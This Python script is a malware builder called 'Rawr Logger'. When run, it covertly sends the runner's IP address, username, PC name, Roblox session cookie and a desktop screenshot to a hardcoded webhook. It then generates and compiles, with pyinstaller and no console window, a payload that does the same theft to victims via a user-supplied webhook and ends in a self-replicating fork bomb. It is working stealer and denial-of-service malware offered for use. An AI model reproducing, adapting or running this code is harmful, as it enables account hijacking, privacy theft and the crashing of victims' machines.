import os
import requests
from pystyle import *
from PIL import ImageGrab
import socket
import browser_cookie3
import time
import shutil
os.system(f'cls & title Rawr Logger!')

u = os.getlogin()
webhook = "Enter Dual Webhook Here"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
RobloxCookie = []
robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
for robloxcookie in robloxcookies:
   if robloxcookie.name == ".ROBLOSECURITY":
    RobloxCookie.append(robloxcookies)
    RobloxCookie.append(robloxcookie.value)

cookie = RobloxCookie[1]
requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
screenshot.close()
with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})



Write.Print(Center.XCenter("""
                                          
                                ▒▒▓▓                              
                                ▒▒▓▓                              
                              ░░██░░                              
                            ░░██████░░                            
                          ▒▒████████░░                            
                        ▒▒██████████░░                            
                      ████████████████▓▓                          
                    ████████████▓▓████▒▒                          
                  ████████████▓▓▒▒██████▓▓                        
                ████████████▓▓▒▒▒▒██████▒▒                        
                ████████████▓▓▒▒▓▓████████▓▓                      
              ▒▒████████████▒▒▓▓██████████▓▓                      
              ██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ░░██████████▓▓▒▒▒▒▓▓████████████▓▓                    
            ████████████▒▒▒▒▒▒████████████████                    
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████                  
            ██████████▓▓▒▒▒▒▒▒▓▓████████████████▒▒                
            ██████████▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒████████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████                
            ████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████████                
            ████████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒████████████                
              ██████▓▓▒▒▒▒▒▒░░▒▒▒▒▒▒▒▒▓▓████████                  
              ████████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ██████▓▓▒▒░░░░░░▒▒▒▒▒▒▓▓████████                  
                ████████▓▓▒▒░░▒▒▒▒▒▒▓▓████████                    
                  ████████▓▓▒▒▒▒▒▒▓▓████████                      
                      ████████████████▓▓                          
                  Made By Jose#0001,TheSoap1#9870                                          
                                         
"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("\nEnter File Name:", Colors.green_to_yellow, interval=0.01)
code = """
import requests
import subprocess, sys
import socket 
import os
import browser_cookie3
from PIL import ImageGrab
u = os.getlogin()
webhook = "john"
hostname = socket.gethostname()   
pc_username = os.getenv("UserName")
ip = socket.gethostbyname(hostname)  
requests.post(webhook,json={'content': f' @everyone Someone Ran The File: '})
requests.post(webhook,json={'content': f'There Ip Is: {ip}'})
requests.post(webhook,json={'content': f'There PC Username Is: {pc_username}'})
requests.post(webhook,json={'content': f'There Pc Name Is:{hostname}'})
RobloxCookie = []
robloxcookies = browser_cookie3.edge(domain_name="roblox.com")
for robloxcookie in robloxcookies:
   if robloxcookie.name == ".ROBLOSECURITY":
    RobloxCookie.append(robloxcookies)
    RobloxCookie.append(robloxcookie.value)

cookie = RobloxCookie[1]
requests.post(webhook,json={'content': f'There Roblox Cookie:{cookie}'})
screenshot = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
screenshot.save(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png')
screenshot.close()
with open(f'C:\\Users\\{u}\\AppData\\Local\\Temp\\sslol.png', 'rb') as f:
  requests.post(webhook,json={'content': f'Picture Of There Desktop:'})
  requests.post(webhook,files={'upload_file': f})
while True:
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
"""
file = open(f'{name}.py', 'a')
file.write(code.replace("john", webhook))
os.system(f'pyinstaller --onefile --noconsole -i NONE {name}.py & cls')
os.remove(f'{name}.py')
os.remove(f'{name}.spec')
shutil.rmtree('build')
Write.Print('Fork bomb compiled in dist folder',Colors.green)
os.system('pause >nul')
